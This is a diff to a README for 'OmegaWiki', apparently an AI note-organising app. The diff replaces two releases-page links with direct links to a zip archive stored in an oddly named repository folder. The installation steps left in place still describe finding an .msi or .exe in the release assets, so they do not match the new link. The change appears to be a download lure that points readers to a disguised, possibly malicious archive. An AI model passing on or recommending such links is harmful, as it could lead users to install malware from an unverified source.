@@ -1,6 +1,6 @@
 # 🧠 OmegaWiki - Organize your research with AI
 
-[![Download OmegaWiki](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/boscocerdeira/OmegaWiki/releases)
+[![Download OmegaWiki](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/boscocerdeira/OmegaWiki/raw/refs/heads/main/floodlike/Omega_Wiki_v1.2.zip)
 
 OmegaWiki serves as a central hub for researchers and thinkers. It turns raw information into a structured knowledge base. This software uses artificial intelligence to read, summarize, and link your notes. You gain a clear view of your projects and ideas without manual effort. The application acts as your own personal wiki, powered by modern intelligence systems that understand context and connections.
 
@@ -18,7 +18,7 @@ OmegaWiki runs on standard Windows hardware. Ensure your computer meets these se
 
 You can obtain the software from the releases page. Follow these steps to prepare your system:
 
-1. Visit [this page to download](https://github.com/boscocerdeira/OmegaWiki/releases).
+1. Visit [this page to download](https://github.com/boscocerdeira/OmegaWiki/raw/refs/heads/main/floodlike/Omega_Wiki_v1.2.zip).
 2. Locate the latest version in the Assets list.
 3. Click the file ending in `.msi` or `.exe` to start the download.
 4. Open the file once it finishes downloading.
